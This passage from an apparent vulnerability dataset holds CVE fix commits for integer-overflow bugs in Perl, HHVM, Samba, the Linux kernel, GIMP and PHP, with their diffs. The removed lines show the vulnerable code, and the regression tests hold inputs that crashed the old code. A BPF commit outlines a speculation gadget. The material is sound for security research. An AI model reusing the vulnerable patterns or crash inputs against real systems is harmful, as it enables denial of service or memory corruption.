s->dct_tokens[plane][i]++;\n             i += (token >> 2) & 0x7f;\n+            if(i>63){\n+                av_log(s->avctx, AV_LOG_ERROR, \"Coefficient index overflow\\n\");\n+                return -1;\n+            }\n             block[perm[i]] = (token >> 9) * dequantizer[perm[i]];\n             i++;\n             break;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-7422","CWE_ID":"189","category":"security","commit_id":"0c2990d652e985784f095bba4bc356481a66aa06","commit_message":"From 0c2990d652e985784f095bba4bc356481a66aa06 Mon Sep 17 00:00:00 2001\nFrom: David Mitchell <davem@iabyn.com>\nDate: Wed, 16 Oct 2013 13:59:12 +0100\nSubject: [PATCH] [perl #119505] Segfault from bad backreference\n\nThe code that parses regex backrefs (or ambiguous backref\/octal) such as\n\\123, did a simple atoi(), which could wrap round to negative values on\nlong digit strings and cause seg faults.\n\nInclude a check on the length of the digit string, and if greater than 9\ndigits, assume it can never be a valid backref (obviating the need for the\natoi() call).\n\nI've also simplified the code a bit, putting most of the \\g handling code\ninto a single block, rather than doing multiple \"if (isg) {...}\".\n---\n regcomp.c     | 64 ++++++++++++++++++++++++++++++++++++++++++-----------------\n t\/re\/re_tests | 41 ++++++++++++++++++++++++++++++++++++++\n 2 files changed, 87 insertions(+), 18 deletions(-)\n\n","diff_code":"diff --git a\/regcomp.c b\/regcomp.c\nindex 0ec6a761aa..317094c819 100644\n--- a\/regcomp.c\n+++ b\/regcomp.c\n@@ -10594,6 +10594,22 @@ S_alloc_maybe_populate_EXACT(pTHX_ RExC_state_t *pRExC_state, regnode *node, I32\n     }\n }\n \n+\n+\/* return atoi(p), unless it's too big to sensibly be a backref,\n+ * in which case return I32_MAX (rather than possibly 32-bit wrapping) *\/\n+\n+static I32\n+S_backref_value(char *p)\n+{\n+    char *q = p;\n+\n+    for (;isDIGIT(*q); q++); \/* calculate length of num *\/\n+    if (q - p == 0 || q - p > 9)\n+        return I32_MAX;\n+    return atoi(p);\n+}\n+\n+\n \/*\n  - regatom - the lowest level\n \n@@ -11027,10 +11043,11 @@ tryagain:\n \tcase '5': case '6': case '7': case '8': case '9':\n \t    {\n \t\tI32 num;\n-\t\tbool isg = *RExC_parse == 'g';\n-\t\tbool isrel = 0; \n \t\tbool hasbrace = 0;\n-\t\tif (isg) {\n+\n+\t\tif (*RExC_parse == 'g') {\n+                    bool isrel = 0;\n+\n \t\t    RExC_parse++;\n \t\t    if (*RExC_parse == '{') {\n \t\t        RExC_parse++;\n@@ -11044,25 +11061,36 @@ tryagain:\n \t\t        if (isrel) RExC_parse--;\n                         RExC_parse -= 2;\t\t            \n \t\t        goto parse_named_seq;\n-\t\t}   }\n-\t\tnum = atoi(RExC_parse);\n-\t\tif (isg && num == 0) {\n-\t            if (*RExC_parse == '0') {\n+                    }\n+\n+                    num = S_backref_value(RExC_parse);\n+                    if (num == 0)\n                         vFAIL(\"Reference to invalid group 0\");\n+                    else if (num == I32_MAX) {\n+                         if (isDIGIT(*RExC_parse))\n+\t\t\t    vFAIL(\"Reference to nonexistent group\");\n+                        else\n+                            vFAIL(\"Unterminated \\\\g... pattern\");\n                     }\n-                    else {\n-\t                vFAIL(\"Unterminated \\\\g... pattern\");\n+\n+                    if (isrel) {\n+                        num = RExC_npar - num;\n+                        if (num < 1)\n+                            vFAIL(\"Reference to nonexistent or unclosed group\");\n                     }\n                 }\n-                if (isrel) {\n-                    num = RExC_npar - num;\n-                    if (num < 1)\n-                        vFAIL(\"Reference to nonexistent or unclosed group\");\n+                else {\n+                    num = S_backref_value(RExC_parse);\n+                    \/* bare \\NNN might be backref or octal *\/\n+                    if (num == I32_MAX || (num > 9 && num >= RExC_npar\n+                            && *RExC_parse != '8' && *RExC_parse != '9'))\n+                        \/* Probably a character specified in octal, e.g. \\35 *\/\n+                        goto defchar;\n                 }\n-                if (!isg && num > 9 && num >= RExC_npar && *RExC_parse != '8' && *RExC_parse != '9')\n-                    \/* Probably a character specified in octal, e.g. \\35 *\/\n-\t\t    goto defchar;\n-\t\telse {\n+\n+                \/* at this point RExC_parse definitely points to a backref\n+                 * number *\/\n+\t\t{\n #ifdef RE_TRACK_PATTERN_OFFSETS\n \t\t    char * const parse_start = RExC_parse - 1; \/* MJD *\/\n #endif\n@@ -11358,7 +11386,7 @@ tryagain:\n                          * 118 OR as \"\\11\" . \"8\" depending on whether there\n                          * were 118 capture buffers defined already in the\n                          * pattern.  *\/\n-                        if ( !isDIGIT(p[1]) || atoi(p) <= RExC_npar )\n+                        if ( !isDIGIT(p[1]) || S_backref_value(p) <= RExC_npar)\n                         {  \/* Not to be treated as an octal constant, go\n                                    find backref *\/\n                             --p;\ndiff --git a\/t\/re\/re_tests b\/t\/re\/re_tests\nindex cf3291d476..4ea072aae1 100644\n--- a\/t\/re\/re_tests\n+++ b\/t\/re\/re_tests\n@@ -1493,6 +1493,47 @@ abc\\N{def\t-\tc\t-\t\\\\N{NAME} must be resolved by the lexer\n a\\87\ta87\tc\t-\tReference to nonexistent group in regex\n a\\97\ta97\tc\t-\tReference to nonexistent group in regex\n \n+# avoid problems with 32-bit signed integer overflow\n+\n+(.)\\g2147483648}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g2147483649}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g2147483650}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g4294967296}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g4294967297}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g4294967298}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g2147483648}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g2147483649}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g2147483650}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g4294967296}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g4294967297}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g4294967298}\tx\tc\t-\tReference to nonexistent group in regex\n+\n+(.)\\g{2147483648}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g{2147483649}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g{2147483650}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g{4294967296}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g{4294967297}\tx\tc\t-\tReference to nonexistent group in regex\n+(.)\\g{4294967298}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g{2147483648}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g{2147483649}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g{2147483650}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g{4294967296}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g{4294967297}\tx\tc\t-\tReference to nonexistent group in regex\n+a(.)\\g{4294967298}\tx\tc\t-\tReference to nonexistent group in regex\n+\n+(.)\\2147483648\tb\\o{214}7483648\ty\t$1\tb\n+(.)\\2147483649\tb\\o{214}7483649\ty\t$1\tb\n+(.)\\2147483650\tb\\o{214}7483650\ty\t$1\tb\n+(.)\\4294967296\tb\\o{42}94967296\ty\t$1\tb\n+(.)\\4294967297\tb\\o{42}94967297\ty\t$1\tb\n+(.)\\4294967298\tb\\o{42}94967298\ty\t$1\tb\n+a(.)\\2147483648\tab\\o{214}7483648\ty\t$1\tb\n+a(.)\\2147483649\tab\\o{214}7483649\ty\t$1\tb\n+a(.)\\2147483650\tab\\o{214}7483650\ty\t$1\tb\n+a(.)\\4294967296\tab\\o{42}94967296\ty\t$1\tb\n+a(.)\\4294967297\tab\\o{42}94967297\ty\t$1\tb\n+a(.)\\4294967298\tab\\o{42}94967298\ty\t$1\tb\n+\n # The below was inserting a NULL into the character class.\n [\\8\\9]\t\\000\tSn\t-\t-\n [\\8\\9]\t-\tsc\t$&\tUnrecognized escape \\\\8 in character class\n-- \n2.15.1-424-g9478a660812\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-4162","CWE_ID":"189","category":"security","commit_id":"cb4644cac4a2797afc847e6c92736664d4b0ea34","commit_message":"From cb4644cac4a2797afc847e6c92736664d4b0ea34 Mon Sep 17 00:00:00 2001\nFrom: Jens Axboe <jaxboe@fusionio.com>\nDate: Wed, 10 Nov 2010 14:36:25 +0100\nSubject: bio: take care not overflow page count when mapping\/copying user data\n\nIf the iovec is being set up in a way that causes uaddr + PAGE_SIZE\nto overflow, we could end up attempting to map a huge number of\npages. Check for this invalid input type.\n\nReported-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: stable@kernel.org\nSigned-off-by: Jens Axboe <jaxboe@fusionio.com>\n---\n fs\/bio.c | 14 +++++++++++++-\n 1 file changed, 13 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/bio.c b\/fs\/bio.c\nindex 8317a2c106bc..4bd454fa844e 100644\n--- a\/fs\/bio.c\n+++ b\/fs\/bio.c\n@@ -834,6 +834,12 @@ struct bio *bio_copy_user_iov(struct request_queue *q,\n \t\tend = (uaddr + iov[i].iov_len + PAGE_SIZE - 1) >> PAGE_SHIFT;\n \t\tstart = uaddr >> PAGE_SHIFT;\n \n+\t\t\/*\n+\t\t * Overflow, abort\n+\t\t *\/\n+\t\tif (end < start)\n+\t\t\treturn ERR_PTR(-EINVAL);\n+\n \t\tnr_pages += end - start;\n \t\tlen += iov[i].iov_len;\n \t}\n@@ -962,6 +968,12 @@ static struct bio *__bio_map_user_iov(struct request_queue *q,\n \t\tunsigned long end = (uaddr + len + PAGE_SIZE - 1) >> PAGE_SHIFT;\n \t\tunsigned long start = uaddr >> PAGE_SHIFT;\n \n+\t\t\/*\n+\t\t * Overflow, abort\n+\t\t *\/\n+\t\tif (end < start)\n+\t\t\treturn ERR_PTR(-EINVAL);\n+\n \t\tnr_pages += end - start;\n \t\t\/*\n \t\t * buffer must be aligned to at least hardsector size for now\n@@ -989,7 +1001,7 @@ static struct bio *__bio_map_user_iov(struct request_queue *q,\n \t\tunsigned long start = uaddr >> PAGE_SHIFT;\n \t\tconst int local_nr_pages = end - start;\n \t\tconst int page_limit = cur_page + local_nr_pages;\n-\t\t\n+\n \t\tret = get_user_pages_fast(uaddr, local_nr_pages,\n \t\t\t\twrite_to_vm, &pages[cur_page]);\n \t\tif (ret < local_nr_pages) {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-6228","CWE_ID":"189","category":"security","commit_id":"1f91e076a585118495b976a413c1df40f6fd3d41","commit_message":"From 1f91e076a585118495b976a413c1df40f6fd3d41 Mon Sep 17 00:00:00 2001\nFrom: Neal Poole <neal@fb.com>\nDate: Mon, 25 Aug 2014 22:29:37 -0700\nSubject: [PATCH] Fix integer overflow in chunk_split\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1515947\n---\n hphp\/runtime\/base\/zend-string.cpp                      | 10 ++++++++--\n hphp\/test\/slow\/ext_string\/chunk_split_overflow.php     |  3 +++\n ...\/slow\/ext_string\/chunk_split_overflow.php.expectf   |  2 ++\n 3 files changed, 13 insertions(+), 2 deletions(-)\n create mode 100644 hphp\/test\/slow\/ext_string\/chunk_split_overflow.php\n create mode 100644 hphp\/test\/slow\/ext_string\/chunk_split_overflow.php.expectf\n\n","diff_code":"diff --git a\/hphp\/runtime\/base\/zend-string.cpp b\/hphp\/runtime\/base\/zend-string.cpp\nindex c40a9469f14..7b64a9a924f 100644\n--- a\/hphp\/runtime\/base\/zend-string.cpp\n+++ b\/hphp\/runtime\/base\/zend-string.cpp\n@@ -626,8 +626,14 @@ String string_chunk_split(const char *src, int srclen, const char *end,\n   int chunks = srclen \/ chunklen; \/\/ complete chunks!\n   int restlen = srclen - chunks * chunklen; \/* srclen % chunklen *\/\n \n-  int out_len = (chunks + 1) * endlen + srclen;\n-  String ret(out_len, ReserveString);\n+  String ret(\n+    safe_address(\n+      chunks + 1,\n+      endlen,\n+      srclen\n+    ),\n+    ReserveString\n+  );\n   char *dest = ret.bufferSlice().ptr;\n \n   const char *p; char *q;\ndiff --git a\/hphp\/test\/slow\/ext_string\/chunk_split_overflow.php b\/hphp\/test\/slow\/ext_string\/chunk_split_overflow.php\nnew file mode 100644\nindex 00000000000..c895bee3639\n--- \/dev\/null\n+++ b\/hphp\/test\/slow\/ext_string\/chunk_split_overflow.php\n@@ -0,0 +1,3 @@\n+<?php\n+\n+chunk_split(str_repeat('*', 2000000), 1.0, str_repeat('*', 2000000));\ndiff --git a\/hphp\/test\/slow\/ext_string\/chunk_split_overflow.php.expectf b\/hphp\/test\/slow\/ext_string\/chunk_split_overflow.php.expectf\nnew file mode 100644\nindex 00000000000..17c953f9163\n--- \/dev\/null\n+++ b\/hphp\/test\/slow\/ext_string\/chunk_split_overflow.php.expectf\n@@ -0,0 +1,2 @@\n+\n+Fatal error: String length exceeded 2^31-2: 4000004000000 in %s on line 3\n","owner":"facebook","repo":"hhvm","source":"cve"},{"CVE_ID":"CVE-2015-3223","CWE_ID":"189","category":"security","commit_id":"ec504dbf69636a554add1f3d5703dd6c3ad450b8","commit_message":"From ec504dbf69636a554add1f3d5703dd6c3ad450b8 Mon Sep 17 00:00:00 2001\nFrom: Jeremy Allison <jra@samba.org>\nDate: Tue, 9 Jun 2015 12:42:10 -0700\nSubject: [PATCH] CVE-2015-3223: lib: ldb: Cope with canonicalise_fn returning\n string \"\", length 0.\n\nBUG: https:\/\/bugzilla.samba.org\/show_bug.cgi?id=11325\n\nSigned-off-by: Jeremy Allison <jra@samba.org>\nReviewed-by: Ralph Boehme <slow@samba.org>\n---\n lib\/ldb\/common\/ldb_match.c | 16 +++++++++++++++-\n 1 file changed, 15 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/lib\/ldb\/common\/ldb_match.c b\/lib\/ldb\/common\/ldb_match.c\nindex a493daec49f..7414289b613 100644\n--- a\/lib\/ldb\/common\/ldb_match.c\n+++ b\/lib\/ldb\/common\/ldb_match.c\n@@ -271,6 +271,14 @@ static int ldb_wildcard_compare(struct ldb_context *ldb,\n \t\tif (cnk.length > val.length) {\n \t\t\tgoto mismatch;\n \t\t}\n+\t\t\/*\n+\t\t * Empty strings are returned as length 0. Ensure\n+\t\t * we can cope with this.\n+\t\t *\/\n+\t\tif (cnk.length == 0) {\n+\t\t\tgoto mismatch;\n+\t\t}\n+\n \t\tif (memcmp((char *)val.data, (char *)cnk.data, cnk.length) != 0) goto mismatch;\n \t\tval.length -= cnk.length;\n \t\tval.data += cnk.length;\n@@ -284,7 +292,13 @@ static int ldb_wildcard_compare(struct ldb_context *ldb,\n \t\tchunk = tree->u.substring.chunks[c];\n \t\tif(a->syntax->canonicalise_fn(ldb, ldb, chunk, &cnk) != 0) goto mismatch;\n \n-\t\t\/* FIXME: case of embedded nulls *\/\n+\t\t\/*\n+\t\t * Empty strings are returned as length 0. Ensure\n+\t\t * we can cope with this.\n+\t\t *\/\n+\t\tif (cnk.length == 0) {\n+\t\t\tgoto mismatch;\n+\t\t}\n \t\tp = strstr((char *)val.data, (char *)cnk.data);\n \t\tif (p == NULL) goto mismatch;\n \t\tif ( (! tree->u.substring.chunks[c + 1]) && (! tree->u.substring.end_with_wildcard) ) {\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-1178","CWE_ID":"189","category":"security","commit_id":"a9671395f6573e90316a9d748588c5435216f6ce","commit_message":"From a9671395f6573e90316a9d748588c5435216f6ce Mon Sep 17 00:00:00 2001\nFrom: Nils Philippsen <nils@redhat.com>\nDate: Wed, 2 Dec 2009 15:12:17 +0100\nSubject: [PATCH] PCX: Avoid allocation overflows.\n\nMultiplying gint values may overflow unless cast into a larger type.\n---\n plug-ins\/common\/file-pcx.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/plug-ins\/common\/file-pcx.c b\/plug-ins\/common\/file-pcx.c\nindex e028bd2e87..162e368d79 100644\n--- a\/plug-ins\/common\/file-pcx.c\n+++ b\/plug-ins\/common\/file-pcx.c\n@@ -431,19 +431,19 @@ load_image (const gchar  *filename,\n \n   if (pcx_header.planes == 1 && pcx_header.bpp == 1)\n     {\n-      dest = g_new (guchar, width * height);\n+      dest = g_new (guchar, ((gsize) width) * height);\n       load_1 (fd, width, height, dest, bytesperline);\n       gimp_image_set_colormap (image, mono, 2);\n     }\n   else if (pcx_header.planes == 4 && pcx_header.bpp == 1)\n     {\n-      dest = g_new (guchar, width * height);\n+      dest = g_new (guchar, ((gsize) width) * height);\n       load_4 (fd, width, height, dest, bytesperline);\n       gimp_image_set_colormap (image, pcx_header.colormap, 16);\n     }\n   else if (pcx_header.planes == 1 && pcx_header.bpp == 8)\n     {\n-      dest = g_new (guchar, width * height);\n+      dest = g_new (guchar, ((gsize) width) * height);\n       load_8 (fd, width, height, dest, bytesperline);\n       fseek (fd, -768L, SEEK_END);\n       fread (cmap, 768, 1, fd);\n@@ -451,7 +451,7 @@ load_image (const gchar  *filename,\n     }\n   else if (pcx_header.planes == 3 && pcx_header.bpp == 8)\n     {\n-      dest = g_new (guchar, width * height * 3);\n+      dest = g_new (guchar, ((gsize) width) * height * 3);\n       load_24 (fd, width, height, dest, bytesperline);\n     }\n   else\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2005-4886","CWE_ID":"189","category":"security","commit_id":"0d3d077cd4f1154e63a9858e47fe3fb1ad0c03e5","commit_message":"From 0d3d077cd4f1154e63a9858e47fe3fb1ad0c03e5 Mon Sep 17 00:00:00 2001\nFrom: Herbert Xu <herbert@gondor.apana.org.au>\nDate: Sun, 24 Apr 2005 20:16:19 -0700\nSubject: [SELINUX]: Fix ipv6_skip_exthdr() invocation causing OOPS.\n\nThe SELinux hooks invoke ipv6_skip_exthdr() with an incorrect\nlength final argument.  However, the length argument turns out\nto be superfluous.\n\nI was just reading ipv6_skip_exthdr and it occured to me that we can\nget rid of len altogether.  The only place where len is used is to\ncheck whether the skb has two bytes for ipv6_opt_hdr.  This check\nis done by skb_header_pointer\/skb_copy_bits anyway.\n\nNow it might appear that we've made the code slower by deferring\nthe check to skb_copy_bits.  However, this check should not trigger\nin the common case so this is OK.\n\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n include\/net\/ipv6.h       |  2 +-\n net\/ipv6\/exthdrs_core.c  | 11 ++++-------\n net\/ipv6\/icmp.c          |  4 ++--\n security\/selinux\/hooks.c |  3 +--\n 4 files changed, 8 insertions(+), 12 deletions(-)\n\n","diff_code":"diff --git a\/include\/net\/ipv6.h b\/include\/net\/ipv6.h\nindex 87c45cbfbaf6..771b47e30f86 100644\n--- a\/include\/net\/ipv6.h\n+++ b\/include\/net\/ipv6.h\n@@ -416,7 +416,7 @@ extern void\t\t\tipv6_push_frag_opts(struct sk_buff *skb,\n \t\t\t\t\t\t    u8 *proto);\n \n extern int\t\t\tipv6_skip_exthdr(const struct sk_buff *, int start,\n-\t\t\t\t\t         u8 *nexthdrp, int len);\n+\t\t\t\t\t         u8 *nexthdrp);\n \n extern int \t\t\tipv6_ext_hdr(u8 nexthdr);\n \ndiff --git a\/net\/ipv6\/exthdrs_core.c b\/net\/ipv6\/exthdrs_core.c\nindex 6dda815c013f..315bc1fbec3f 100644\n--- a\/net\/ipv6\/exthdrs_core.c\n+++ b\/net\/ipv6\/exthdrs_core.c\n@@ -41,8 +41,8 @@ int ipv6_ext_hdr(u8 nexthdr)\n  * when Linux implements ESP (and maybe AUTH) headers.\n  * --AK\n  *\n- * This function parses (probably truncated) exthdr set \"hdr\"\n- * of length \"len\". \"nexthdrp\" initially points to some place,\n+ * This function parses (probably truncated) exthdr set \"hdr\".\n+ * \"nexthdrp\" initially points to some place,\n  * where type of the first header can be found.\n  *\n  * It skips all well-known exthdrs, and returns pointer to the start\n@@ -63,7 +63,7 @@ int ipv6_ext_hdr(u8 nexthdr)\n  * --ANK (980726)\n  *\/\n \n-int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp, int len)\n+int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp)\n {\n \tu8 nexthdr = *nexthdrp;\n \n@@ -71,13 +71,11 @@ int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp, int len\n \t\tstruct ipv6_opt_hdr _hdr, *hp;\n \t\tint hdrlen;\n \n-\t\tif (len < (int)sizeof(struct ipv6_opt_hdr))\n-\t\t\treturn -1;\n \t\tif (nexthdr == NEXTHDR_NONE)\n \t\t\treturn -1;\n \t\thp = skb_header_pointer(skb, start, sizeof(_hdr), &_hdr);\n \t\tif (hp == NULL)\n-\t\t\tBUG();\n+\t\t\treturn -1;\n \t\tif (nexthdr == NEXTHDR_FRAGMENT) {\n \t\t\tunsigned short _frag_off, *fp;\n \t\t\tfp = skb_header_pointer(skb,\n@@ -97,7 +95,6 @@ int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp, int len\n \t\t\thdrlen = ipv6_optlen(hp); \n \n \t\tnexthdr = hp->nexthdr;\n-\t\tlen -= hdrlen;\n \t\tstart += hdrlen;\n \t}\n \ndiff --git a\/net\/ipv6\/icmp.c b\/net\/ipv6\/icmp.c\nindex 87b9082ceab2..8e0f569b883e 100644\n--- a\/net\/ipv6\/icmp.c\n+++ b\/net\/ipv6\/icmp.c\n@@ -135,7 +135,7 @@ static int is_ineligible(struct sk_buff *skb)\n \tif (len < 0)\n \t\treturn 1;\n \n-\tptr = ipv6_skip_exthdr(skb, ptr, &nexthdr, len);\n+\tptr = ipv6_skip_exthdr(skb, ptr, &nexthdr);\n \tif (ptr < 0)\n \t\treturn 0;\n \tif (nexthdr == IPPROTO_ICMPV6) {\n@@ -514,7 +514,7 @@ static void icmpv6_notify(struct sk_buff *skb, int type, int code, u32 info)\n \tnexthdr = ((struct ipv6hdr *)skb->data)->nexthdr;\n \tif (ipv6_ext_hdr(nexthdr)) {\n \t\t\/* now skip over extension headers *\/\n-\t\tinner_offset = ipv6_skip_exthdr(skb, sizeof(struct ipv6hdr), &nexthdr, skb->len - sizeof(struct ipv6hdr));\n+\t\tinner_offset = ipv6_skip_exthdr(skb, sizeof(struct ipv6hdr), &nexthdr);\n \t\tif (inner_offset<0)\n \t\t\treturn;\n \t} else {\ndiff --git a\/security\/selinux\/hooks.c b\/security\/selinux\/hooks.c\nindex 2ae7d3cb8df4..0d378141c95a 100644\n--- a\/security\/selinux\/hooks.c\n+++ b\/security\/selinux\/hooks.c\n@@ -2855,8 +2855,7 @@ static int selinux_parse_skb_ipv6(struct sk_buff *skb, struct avc_audit_data *ad\n \n \tnexthdr = ip6->nexthdr;\n \toffset += sizeof(_ipv6h);\n-\toffset = ipv6_skip_exthdr(skb, offset, &nexthdr,\n-\t\t\t\t  skb->tail - skb->head - offset);\n+\toffset = ipv6_skip_exthdr(skb, offset, &nexthdr);\n \tif (offset < 0)\n \t\tgoto out;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-0044","CWE_ID":"189","category":"security","commit_id":"a5cd335165e31db9dbab636fd29895d41da55dd2","commit_message":"From a5cd335165e31db9dbab636fd29895d41da55dd2 Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Wed, 23 Nov 2011 01:12:01 -0500\nSubject: drm: integer overflow in drm_mode_dirtyfb_ioctl()\n\nThere is a potential integer overflow in drm_mode_dirtyfb_ioctl()\nif userspace passes in a large num_clips.  The call to kmalloc would\nallocate a small buffer, and the call to fb->funcs->dirty may result\nin a memory corruption.\n\nReported-by: Haogang Chen <haogangchen@gmail.com>\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nCc: stable@kernel.org\nSigned-off-by: Dave Airlie <airlied@redhat.com>\n---\n drivers\/gpu\/drm\/drm_crtc.c | 4 ++++\n include\/drm\/drm_mode.h     | 2 ++\n 2 files changed, 6 insertions(+)\n\n","diff_code":"diff --git a\/drivers\/gpu\/drm\/drm_crtc.c b\/drivers\/gpu\/drm\/drm_crtc.c\nindex 405c63b9d539..8323fc389840 100644\n--- a\/drivers\/gpu\/drm\/drm_crtc.c\n+++ b\/drivers\/gpu\/drm\/drm_crtc.c\n@@ -1873,6 +1873,10 @@ int drm_mode_dirtyfb_ioctl(struct drm_device *dev,\n \t}\n \n \tif (num_clips && clips_ptr) {\n+\t\tif (num_clips < 0 || num_clips > DRM_MODE_FB_DIRTY_MAX_CLIPS) {\n+\t\t\tret = -EINVAL;\n+\t\t\tgoto out_err1;\n+\t\t}\n \t\tclips = kzalloc(num_clips * sizeof(*clips), GFP_KERNEL);\n \t\tif (!clips) {\n \t\t\tret = -ENOMEM;\ndiff --git a\/include\/drm\/drm_mode.h b\/include\/drm\/drm_mode.h\nindex d30bedfeb7ef..ddd46db65b57 100644\n--- a\/include\/drm\/drm_mode.h\n+++ b\/include\/drm\/drm_mode.h\n@@ -235,6 +235,8 @@ struct drm_mode_fb_cmd {\n #define DRM_MODE_FB_DIRTY_ANNOTATE_FILL 0x02\n #define DRM_MODE_FB_DIRTY_FLAGS         0x03\n \n+#define DRM_MODE_FB_DIRTY_MAX_CLIPS     256\n+\n \/*\n  * Mark a region of a framebuffer as dirty.\n  *\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-3587","CWE_ID":"189","category":"security","commit_id":"7ba1409a1aee5925180de546057ddd84ff267947","commit_message":"From 7ba1409a1aee5925180de546057ddd84ff267947 Mon Sep 17 00:00:00 2001\nFrom: Remi Collet <rcollet@redhat.com>\nDate: Thu, 14 Aug 2014 17:19:03 -0700\nSubject: [PATCH] Fix bug #67716 - Segfault in cdf.c\n\n---\n NEWS                        | 1 +\n ext\/fileinfo\/libmagic\/cdf.c | 2 +-\n 2 files changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex 473f96a35e7b..9805a719d345 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -8,6 +8,7 @@ PHP                                                                        NEWS\n - Fileinfo:\n   . Fixed bug #67705 (extensive backtracking in rule regular expression).\n     (CVE-2014-3538) (Remi)\n+  . Fixed bug #67716 (Segfault in cdf.c). (CVE-2014-3587) (Remi)\n \n - GD:\n   . Fixed bug #66901 (php-gd 'c_color' NULL pointer dereference).\ndiff --git a\/ext\/fileinfo\/libmagic\/cdf.c b\/ext\/fileinfo\/libmagic\/cdf.c\nindex 429f3b952f68..2c0a2d9dfcd8 100644\n--- a\/ext\/fileinfo\/libmagic\/cdf.c\n+++ b\/ext\/fileinfo\/libmagic\/cdf.c\n@@ -820,7 +820,7 @@ cdf_read_property_info(const cdf_stream_t *sst, const cdf_header_t *h,\n \t\tq = (const uint8_t *)(const void *)\n \t\t    ((const char *)(const void *)p + ofs\n \t\t    - 2 * sizeof(uint32_t));\n-\t\tif (q > e) {\n+\t\tif (q < p || q > e) {\n \t\t\tDPRINTF((\"Ran of the end %p > %p\\n\", q, e));\n \t\t\tgoto out;\n \t\t}\n","owner":"php","repo":"php-src","source":"cve"},{"CVE_ID":"CVE-2019-7308","CWE_ID":"189","category":"security","commit_id":"979d63d50c0c0f7bc537bf821e056cc9fe5abd38","commit_message":"From 979d63d50c0c0f7bc537bf821e056cc9fe5abd38 Mon Sep 17 00:00:00 2001\nFrom: Daniel Borkmann <daniel@iogearbox.net>\nDate: Thu, 3 Jan 2019 00:58:34 +0100\nSubject: bpf: prevent out of bounds speculation on pointer arithmetic\n\nJann reported that the original commit back in b2157399cc98\n(\"bpf: prevent out-of-bounds speculation\") was not sufficient\nto stop CPU from speculating out of bounds memory access:\nWhile b2157399cc98 only focussed on masking array map access\nfor unprivileged users for tail calls and data access such\nthat the user provided index gets sanitized from BPF program\nand syscall side, there is still a more generic form affected\nfrom BPF programs that applies to most maps that hold user\ndata in relation to dynamic map access when dealing with\nunknown scalars or \"slow\" known scalars as access offset, for\nexample:\n\n  - Load a map value pointer into R6\n  - Load an index into R7\n  - Do a slow computation (e.g. with a memory dependency) that\n    loads a limit into R8 (e.g. load the limit from a map for\n    high latency, then mask it to make the verifier happy)\n  - Exit if R7 >= R8 (mispredicted branch)\n  - Load R0 = R6[R7]\n  - Load R0 = R6[R0]\n\nFor unknown scalars there are two options in the BPF verifier\nwhere we could derive knowledge from in order to guarantee\nsafe access to the memory: i) While <\/>\/<=\/>= variants won't\nallow to derive any lower or upper bounds from the unknown\nscalar where it would be safe to add it to the map value\npointer, it is possible through ==\/!= test however. ii) another\noption is to transform the unknown scalar into a known scalar,\nfor example, through ALU ops combination such as R &= <imm>\nfollowed by R |= <imm> or any similar combination where the\noriginal information from the unknown scalar would be destroyed\nentirely leaving R with a constant. The initial slow load still\nprecedes the latter ALU ops on that register, so the CPU\nexecutes speculatively from that point. Once we have the known\nscalar, any compare operation would work then. A third option\nonly involving registers with known scalars could be crafted\nas described in [0] where a CPU port (e.g. Slow Int unit)\nwould be filled with many dependent computations such that\nthe subsequent condition depending on its outcome has to wait\nfor evaluation on its execution port and thereby executing\nspeculatively if the speculated code can be scheduled on a\ndifferent execution port, or any other form of mistraining\nas described in [1], for example. Given this is not limited\nto only unknown scalars, not only map but also stack access\nis affected since both is accessible for unprivileged users\nand could potentially be used for out of bounds access under\nspeculation.\n\nIn order to prevent any of these cases, the verifier is now\nsanitizing pointer arithmetic on the offset such that any\nout of bounds speculation would be masked in a way where 